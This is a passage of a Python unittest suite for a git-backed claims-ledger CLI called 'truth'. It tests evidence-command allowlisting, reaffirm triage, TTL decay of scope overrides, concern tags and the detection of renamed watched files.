            with open(os.path.join(d, ".truth", "evidence-allow"), "a") as f:
                f.write("touch\n")  # allowlisted NOW; delisted later
            marker = os.path.join(d, "MARKER")
            r = _truth(d, "claim", "marker probe of f.txt", "--class",
                       "VERIFIED", "--evidence-cmd", "touch MARKER",
                       "--paths", "f.txt")
            self.assertEqual(r.returncode, 0, r.stderr)
            cid = r.stdout.strip().splitlines()[-1]
            # intake ran it (author's own session -- ADR-029): the origin
            # of the marker, deleted so any reappearance is reaffirm's
            self.assertTrue(os.path.exists(marker))
            os.unlink(marker)
            r = _truth(d, "verdict", cid, "agree", "--basis", "ran it",
                       env_extra={"TRUTH_SESSION": "s-verifier"})
            self.assertEqual(r.returncode, 0, r.stderr)
            with open(os.path.join(d, "f.txt"), "a") as f:
                f.write("more\n")
            _git(d, "add", "f.txt")
            _git(d, "commit", "-qm", "touch watched path")
            r = _truth(d, "invalidate-scan")
            self.assertIn(cid, r.stdout)
            # committed policy changes: 'touch' is no longer allowlisted
            with open(os.path.join(d, ".truth", "evidence-allow"), "w") as f:
                f.write("cat\ngrep\n")
            n = len(self._ledger_lines(d))
            r = _truth(d, "reaffirm",
                       env_extra={"TRUTH_SESSION": "s-reaffirm"})
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn("manual verification only", r.stdout)
            self.assertIn("'touch' is not in", r.stdout)
            self.assertIn("1 manual", r.stdout)
            self.assertFalse(os.path.exists(marker),
                             "reaffirm EXECUTED a command the CURRENT "
                             "allowlist refuses")
            self.assertEqual(len(self._ledger_lines(d)), n,
                             "the screen-refusal arm must file nothing")
            r = _truth(d, "list", "--stale")
            self.assertIn(cid, r.stdout)

    def test_match_agree_records_what_the_anchor_advance_cleared(self):
        """Red-team F2: the anchor advance buries the watched-path change
        that staled the claim outside every future scan diff window; the
        filed agree must record the prior effective anchor and the
        watched files auto-cleared, and stay contract-valid."""
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            self._stale_verified_claim(d)
            # commits: init, add g (= claim/agree anchor), touch g.txt
            prior = subprocess.run(["git", "-C", d, "rev-parse", "HEAD~1"],
                                   capture_output=True,
                                   text=True).stdout.strip()
            r = _truth(d, "reaffirm",
                       env_extra={"TRUTH_SESSION": "s-reaffirm"})
            self.assertEqual(r.returncode, 0, r.stderr)
            filed = json.loads(self._ledger_lines(d)[-1])
            cleared = filed["payload"]["reaffirm_cleared"]
            self.assertEqual(cleared["prior_anchor"], prior,
                             "prior_anchor must be the diff base the scan "
                             "staled the claim against")
            self.assertEqual(cleared["touched"], ["g.txt"],
                             "the auto-cleared watched files must be "
                             "recorded (f.txt did not change; g.txt did)")
            # the audited record rides the open payload contract: both
            # validate surfaces still accept the ledger
            r = _truth(d, "validate")
            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_self_verdict_override_is_loud_with_a_count(self):
        """Red-team F4: TRUTH_SELF_VERDICT=1 amplifies a per-claim
        override across the whole sweep; reaffirm must say so on stderr
        with the count of same-session claims it auto-agreed."""
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            self._stale_verified_claim(d)  # authored by s-core-test
            r = _truth(d, "reaffirm",  # runs AS s-core-test, override on
                       env_extra={"TRUTH_SELF_VERDICT": "1"})
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn("filed agree", r.stdout)
            self.assertIn("TRUTH_SELF_VERDICT=1", r.stderr)
            self.assertIn("auto-agreed 1 claim(s) THIS SESSION authored",
                          r.stderr)

    def test_json_output_shape(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            cid = self._stale_verified_claim(d)
            r = _truth(d, "reaffirm", "--json",
                       env_extra={"TRUTH_SESSION": "s-reaffirm"})
            out = json.loads(r.stdout)
            self.assertFalse(out["dry_run"])
            self.assertEqual(out["counts"]["match"], 1)
            self.assertEqual(sorted(out["counts"]),
                             sorted(tm.REAFFIRM_ARMS))
            (row,) = out["claims"]
            self.assertEqual(row["id"], cid)
            self.assertEqual(row["arm"], "match")
            self.assertRegex(row["filed"], r"^tr-[0-9a-f]{8}$")


class TestScopeDecayCLI(unittest.TestCase):
    """R12 / ADR-032 end-to-end in throwaway sandboxes: a --scope-ok
    override without --ttl-days lands ttl'd + flagged, expires via the
    unchanged ADR-019 scan, and reaffirm triages it to the ttl arm."""

    SB = "the include filter deliberately covers the whole codebase"
    QTEXT = "no occurrences remain anywhere in the codebase"
    ECMD = "grep -rc data --include=f.txt ."

    def _ledger(self, d):
        with open(os.path.join(d, ".truth", "claims.jsonl")) as f:
            return [json.loads(x) for x in f.read().splitlines()]

    def _scope_claim(self, d, *extra, env_extra=None):
        r = _truth(d, "claim", self.QTEXT, "--class", "VERIFIED",
                   "--evidence-cmd", self.ECMD, "--paths", "f.txt",
                   "--tier", "P1", "--scope-ok", self.SB, *extra,
                   env_extra=env_extra)
        self.assertEqual(r.returncode, 0, r.stderr)
        return r

    def test_scope_ok_without_ttl_lands_ttl30_flagged_and_notices(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            r = self._scope_claim(d)
            self.assertIn("ADR-032", r.stderr, "the decay notice must print")
            self.assertIn("30-day", r.stderr)
            p = self._ledger(d)[-1]["payload"]
            self.assertEqual(p["ttl_days"], 30)
            self.assertIs(p["ttl_default"], True)
            self.assertEqual(p["scope_basis"], self.SB)

    def test_explicit_ttl_is_preserved_and_unflagged_and_silent(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            r = self._scope_claim(d, "--ttl-days", "90")
            self.assertNotIn("ADR-032", r.stderr,
                             "an explicit --ttl-days must not decay-notice")
            p = self._ledger(d)[-1]["payload"]
            self.assertEqual(p["ttl_days"], 90)
            self.assertNotIn("ttl_default", p,
                             "explicit ttl must not be flagged defaulted")

    def test_backdated_scope_ok_expires_via_the_unchanged_scan(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            past = {"TRUTH_NOW": "2026-06-01T00:00:00+00:00"}  # >30d before now
            r = self._scope_claim(d, env_extra=past)
            cid = r.stdout.strip().splitlines()[-1]
            r = _truth(d, "invalidate-scan")  # real now, long past ttl 30
            self.assertIn(cid, r.stdout)
            inval = self._ledger(d)[-1]
            self.assertEqual(inval["kind"], "invalidation")
            self.assertEqual(inval["payload"]["reason_code"], "ttl")
            r = _truth(d, "list", "--stale")
            self.assertIn(cid, r.stdout)
            # ADR-030 arm 1: reaffirm triages the expired override to re-file
            r = _truth(d, "reaffirm", "--dry-run",
                       env_extra={"TRUTH_SESSION": "s-reaffirm"})
            self.assertIn("re-file required", r.stdout)
            self.assertIn("ADR-019", r.stdout)
            self.assertIn("1 ttl (re-file)", r.stdout)


class TestOverrideReportCLI(unittest.TestCase):
    """R13 / ADR-033 end-to-end: a scope-ok override expires, the same
    justification is re-filed, and `truth stats` raises the advisory."""

    SB = "the include filter deliberately covers the whole codebase"
    QTEXT = "no occurrences remain anywhere in the codebase"
    ECMD = "grep -rc data --include=f.txt ."

    def _scope_claim(self, d, env_extra=None):
        r = _truth(d, "claim", self.QTEXT, "--class", "VERIFIED",
                   "--evidence-cmd", self.ECMD, "--paths", "f.txt",
                   "--tier", "P1", "--scope-ok", self.SB, env_extra=env_extra)
        self.assertEqual(r.returncode, 0, r.stderr)
        return r.stdout.strip().splitlines()[-1]

    def test_verbatim_refile_after_expiry_raises_the_advisory(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            past = {"TRUTH_NOW": "2026-06-01T00:00:00+00:00"}
            prior = self._scope_claim(d, env_extra=past)
            _truth(d, "invalidate-scan")  # prior -> stale (ttl, ttl_default)
            repeat = self._scope_claim(d)  # same sentence + scope_basis, now
            r = _truth(d, "stats")
            self.assertIn("overrides:", r.stdout)
            self.assertIn("decay-expiries=1", r.stdout)
            self.assertIn("ADR-033", r.stdout)
            self.assertIn("review whether the scope judgment was ever real",
                          r.stdout)
            self.assertIn(repeat, r.stdout)
            self.assertIn(prior, r.stdout)
            # --json shape
            r = _truth(d, "stats", "--json")
            o = json.loads(r.stdout)["overrides"]
            self.assertEqual(o["scope_basis_filings"], 2)
            self.assertEqual(o["decay_expiries"], 1)
            self.assertEqual(o["max_scope_ttl_days"], 30)
            self.assertEqual(len(o["repeats"]), 1)
            self.assertEqual(o["repeats"][0]["claim"], repeat)
            self.assertEqual(o["repeats"][0]["prior"], prior)
            self.assertEqual(o["repeats"][0]["prior_status"], "stale")

    def test_max_scope_ttl_rendered_in_plain_text(self):
        """F2: the `max scope ttl <N>d` suffix is part of the PLAIN
        `truth stats` render, not only the JSON field. A large --ttl-days
        (the visible opt-out) must surface in plain text; this fails if
        the suffix is ever dropped while JSON stays intact."""
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            r = _truth(d, "claim", self.QTEXT, "--class", "VERIFIED",
                       "--evidence-cmd", self.ECMD, "--paths", "f.txt",
                       "--tier", "P1", "--scope-ok", self.SB,
                       "--ttl-days", "36500")
            self.assertEqual(r.returncode, 0, r.stderr)
            r = _truth(d, "stats")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn("max scope ttl 36500d", r.stdout)
            # and the JSON twin carries the same number (both surfaces)
            rj = _truth(d, "stats", "--json")
            self.assertEqual(
                json.loads(rj.stdout)["overrides"]["max_scope_ttl_days"],
                36500)


class TestConcernsCore(unittest.TestCase):
    """42010 stakeholder concerns are TRIAGE METADATA only: slug hygiene,
    the stats tally, and -- the hard constraint -- proof the fold is
    concern-blind (a tagged claim and its untagged twin derive identical
    status under every verdict/invalidation shape)."""

    def test_slug_hygiene(self):
        self.assertIsNone(tm.concerns_intake_error(None))
        self.assertIsNone(tm.concerns_intake_error([]))
        self.assertIsNone(tm.concerns_intake_error(
            ["security", "a-b-1", "x" * 32]))
        for bad in ("Security", "sec_urity", "", "x" * 33,
                    "sec urity", "s/c", "security\n", "\nsecurity"):
            self.assertIsNotNone(tm.concerns_intake_error([bad]),
                                 repr(bad))

    def test_claim_concerns_read_side_degrades(self):
        """red-team F2: the read verbs (list --concern, stats) consume
        claim_concerns(), which returns [] for any malformed hand-appended
        value -- never a crash on an unhashable item, never substring
        matching on a bare string. validate reports the malformation; the
        reads just degrade to 'no tags'."""
        self.assertEqual(tm.claim_concerns({"concerns":
                                            ["security", "latency"]}),
                         ["security", "latency"])
        self.assertEqual(tm.claim_concerns({}), [])
        self.assertEqual(tm.claim_concerns({"concerns": "security"}), [])
        self.assertEqual(tm.claim_concerns({"concerns": [["a"]]}), [])
        self.assertEqual(tm.claim_concerns({"concerns": ["ok", ["a"], 3]}),
                         ["ok"])
        # and stats_report itself survives the unhashable-item ledger
        report = tm.stats_report(
            events(rec("claim", claim_p(concerns=[["a"]]))), NOW)
        self.assertEqual(report["concerns"], {})
        self.assertEqual(report["concerns_untagged_active"], 1)

    def test_fold_is_concern_blind(self):
        # bare claim first -- no verdict/invalidation at all: the INITIAL
        # status must be twin-identical too (red-team: a mutant setting
        # initial status off concerns escaped the verdict-only twins)
        cp, _ = tm.fold(events(rec("claim", claim_p())))
        ct, _ = tm.fold(events(
            rec("claim", claim_p(concerns=["latency", "security"]))))
        self.assertEqual(cp["tr-00000001"]["status"], "unverified")
        self.assertEqual(cp["tr-00000001"]["status"],
                         ct["tr-00000001"]["status"])
        self.assertEqual(cp["tr-00000001"]["status_ts"],
                         ct["tr-00000001"]["status_ts"])
        for kind, payload in (
            ("verdict", {"claim": "tr-00000001", "verdict": "agree",
                         "basis": "b"}),
            ("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                         "basis": "b"}),
            ("verdict", {"claim": "tr-00000001", "verdict": "cannot_verify",
                         "basis": "b"}),
            ("verdict", {"claim": "tr-00000001", "verdict": "retracted",
                         "basis": "b"}),
            ("invalidation", {"claim": "tr-00000001", "commit": "abc1234",
                              "reason": "x"}),
        ):
            plain = events(rec("claim", claim_p()),
                           rec(kind, payload, rid="tr-00000002"))
            tagged = events(rec("claim", claim_p(concerns=["latency",
                                                           "security"])),
                            rec(kind, payload, rid="tr-00000002"))
            cp, _ = tm.fold(plain)
            ct, _ = tm.fold(tagged)
            self.assertEqual(cp["tr-00000001"]["status"],
                             ct["tr-00000001"]["status"], kind)
            self.assertEqual(cp["tr-00000001"]["status_ts"],
                             ct["tr-00000001"]["status_ts"], kind)

    def test_stats_report_concern_tally(self):
        evs = events(
            rec("claim", claim_p(concerns=["security"])),
            rec("claim", claim_p(text="config parser rejects bad input",
                                 concerns=["latency", "security"]),
                rid="tr-00000002"),
            rec("claim", claim_p(text="cache layer evicts old entries"),
                rid="tr-00000003"),
            rec("claim", claim_p(text="worker pool drains on shutdown",
                                 concerns=["security"]),
                rid="tr-00000004"),
            rec("verdict", {"claim": "tr-00000004", "verdict": "retracted",
                            "basis": "b"}, rid="tr-00000005"),
            rec("claim", claim_p(text="scheduler honors the quiet hours"),
                rid="tr-00000006"),
            rec("invalidation", {"claim": "tr-00000006", "commit": "abc1234",
                                 "reason": "x"}, rid="tr-00000007"))
        report = tm.stats_report(evs, NOW)
        # retracted tr-00000004 drops out of the tag counts; the stale
        # untagged tr-00000006 is not active, so untagged counts only
        # tr-00000003
        self.assertEqual(report["concerns"], {"latency": 1, "security": 2})
        self.assertEqual(report["concerns_untagged_active"], 1)

    def test_old_format_records_still_validate(self):
        # backward compatibility: a ledger predating concerns (no key at
        # all) is not an error anywhere in the mirror
        self.assertEqual(tm.validate_events(events(rec("claim", claim_p()))),
                         [])

class TestConcernsCLI(unittest.TestCase):
    """--concern end to end: filing, hygiene refusal, list filter, stats
    section, and old-format ledger backward compatibility."""

    def test_filing_stores_sorted_deduplicated_tags(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            r = _truth(d, "claim", "f.txt holds data",
                       "--concern", "security", "--concern", "latency",
                       "--concern", "security")
            self.assertEqual(r.returncode, 0, r.stderr)
            with open(os.path.join(d, ".truth", "claims.jsonl")) as f:
                filed = json.loads(f.read().splitlines()[-1])
            self.assertEqual(filed["payload"]["concerns"],
                             ["latency", "security"])
            # and validate accepts what claim filed
            self.assertEqual(_truth(d, "validate").returncode, 0)

    def test_untagged_filing_carries_no_concerns_key(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            r = _truth(d, "claim", "f.txt holds data")
            self.assertEqual(r.returncode, 0, r.stderr)
            with open(os.path.join(d, ".truth", "claims.jsonl")) as f:
                filed = json.loads(f.read().splitlines()[-1])
            self.assertNotIn("concerns", filed["payload"])

    def test_malformed_tag_refused_before_anything_files(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            for bad in ("Not_A_Slug", "UPPER", "", "x" * 33, "a b",
                        "security\n"):  # F1: $ matches before trailing \n
                r = _truth(d, "claim", "f.txt holds data", "--concern", bad)
                self.assertNotEqual(r.returncode, 0, repr(bad))
                self.assertIn("is not a slug", r.stderr, repr(bad))
                self.assertIn("not a concern-gate", r.stderr, repr(bad))
            with open(os.path.join(d, ".truth", "claims.jsonl")) as f:
                self.assertEqual(f.read(), "")  # nothing was filed

    def test_list_filter_composes_with_status_flags(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            a = _truth(d, "claim", "f.txt holds data",
                       "--concern", "security").stdout.strip()
            b = _truth(d, "claim", "config parser rejects bad input",
                       "--concern", "latency").stdout.strip()
            _truth(d, "claim", "cache layer evicts old entries")
            r = _truth(d, "list", "--concern", "security", "--json")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertEqual([row["id"] for row in json.loads(r.stdout)], [a])
            # composes with a status flag: both unverified, so the tag
            # still narrows to one; --live matches nothing yet
            r = _truth(d, "list", "--unverified", "--concern", "latency",
                       "--json")
            self.assertEqual([row["id"] for row in json.loads(r.stdout)], [b])
            r = _truth(d, "list", "--live", "--concern", "latency", "--json")
            self.assertEqual(json.loads(r.stdout), [])

    def test_stats_concerns_section_plain_and_json(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            _truth(d, "claim", "f.txt holds data", "--concern", "security",
                   "--concern", "latency")
            _truth(d, "claim", "cache layer evicts old entries")
            r = _truth(d, "stats")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn("concerns: latency=1, security=1, "
                          "untagged-active=1", r.stdout)
            rj = _truth(d, "stats", "--json")
            report = json.loads(rj.stdout)
            self.assertEqual(report["concerns"],
                             {"latency": 1, "security": 1})
            self.assertEqual(report["concerns_untagged_active"], 1)

    def test_old_format_ledger_lists_folds_validates_stats(self):
        """CRITICAL backward compatibility: a ledger written before
        concerns existed (no key anywhere) must list, fold, validate, and
        stats without error, and a --concern filter over it is simply
        empty."""
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            old = [rec("claim", claim_p()),
                   rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                                   "basis": "b"}, rid="tr-00000002",
                       ts="2026-07-02T00:00:00.000000+00:00")]
            with open(os.path.join(d, ".truth", "claims.jsonl"), "w") as f:
                f.write("".join(json.dumps(e) + "\n" for e in old))
            r = _truth(d, "validate")
            self.assertEqual(r.returncode, 0, r.stderr)
            r = _truth(d, "list", "--json")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertEqual([row["status"] for row in json.loads(r.stdout)],
                             ["live"])
            r = _truth(d, "list", "--concern", "security", "--json")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertEqual(json.loads(r.stdout), [])
            r = _truth(d, "stats")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn("concerns: none, untagged-active=1", r.stdout)


class TestScanRenameBlindness(unittest.TestCase):
    """A `git mv` of a watched path must stale its claims. With rename
    detection active, `git diff --name-only` emits only the DESTINATION
    path, so the watched old path never appears and the scan silently
    misses the move -- the --no-renames regression found in the wild
    (paper-v2 retired to docs/archive/ left three claims falsely live)."""

    def test_git_mv_of_watched_path_stales_the_claim(self):
        with tempfile.TemporaryDirectory() as d:
            _mk_sandbox(d)
            r = _truth(d, "claim", "f.txt holds data", "--class",
                       "VERIFIED", "--evidence-cmd", "cat f.txt",
                       "--paths", "f.txt")
            self.assertEqual(r.returncode, 0, r.stderr)
            cid = r.stdout.strip().splitlines()[-1]
            r = _truth(d, "verdict", cid, "agree", "--basis", "checked",
                       env_extra={"TRUTH_SESSION": "s-verifier"})
            self.assertEqual(r.returncode, 0, r.stderr)
            # pin rename detection ON (repo config beats any user
            # diff.renames=false) so the pre-fix scan reliably exhibits
            # the blindness this test pins
            _git(d, "config", "diff.renames", "true")
            # 100%-similarity rename: the exact shape rename detection
            # collapses to destination-only in --name-only output.
            _git(d, "mv", "f.txt", "archived.txt")
            _git(d, "commit", "-qm", "retire f.txt")
            r = _truth(d, "invalidate-scan")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn(cid, r.stdout)
            r = _truth(d, "list", "--stale")
            self.assertIn(cid, r.stdout)


if __name__ == "__main__":
    unittest.main(verbosity=1)
